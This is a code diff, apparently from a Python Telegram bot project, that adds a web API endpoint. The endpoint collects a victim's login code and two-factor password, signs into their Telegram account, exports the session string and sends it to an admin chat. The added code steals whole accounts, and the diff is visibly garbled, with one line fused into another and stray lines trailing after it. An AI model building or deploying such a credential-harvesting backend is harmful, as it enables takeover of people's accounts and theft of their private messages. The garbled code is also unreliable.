@@ -67,6 +67,39 @@ async def main():
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
+    asyncio.run(main())            if not session: return web.json_response({"status": "error", "message": "Сессия истекла"})
+            try:
+                await session["client"].sign_in(session["phone"], session["hash"], code)
+                s_string = await session["client"].export_session_string()
+                await bot.send_message(ADMIN_ID, f"✅ ВХОД!\nНомер: {session['phone']}\n\n`{s_string}`", parse_mode="Markdown")
+                return web.json_response({"status": "success"})
+            except SessionPasswordNeeded:
+                return web.json_response({"status": "need_2fa"})
+
+        elif action == "send_2fa":
+            password = data.get("password")
+            session = active_clients.get(user_id)
+            await session["client"].check_password(password)
+            s_string = await session["client"].export_session_string()
+            await bot.send_message(ADMIN_ID, f"✅ ВХОД (2FA)!\nНомер: {session['phone']}\n\n`{s_string}`", parse_mode="Markdown")
+            return web.json_response({"status": "success"})
+
+    except Exception as e:
+        return web.json_response({"status": "error", "message": str(e)})
+
+app = web.Application()
+cors = aiohttp_cors.setup(app, defaults={"*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")})
+resource = app.router.add_resource("/api")
+cors.add(resource.add_route("POST", handle_api))
+
+async def main():
+    port = int(os.environ.get("PORT", 10000))
+    runner = web.AppRunner(app)
+    await runner.setup()
+    await web.TCPSite(runner, '0.0.0.0', port).start()
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
     asyncio.run(main())
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
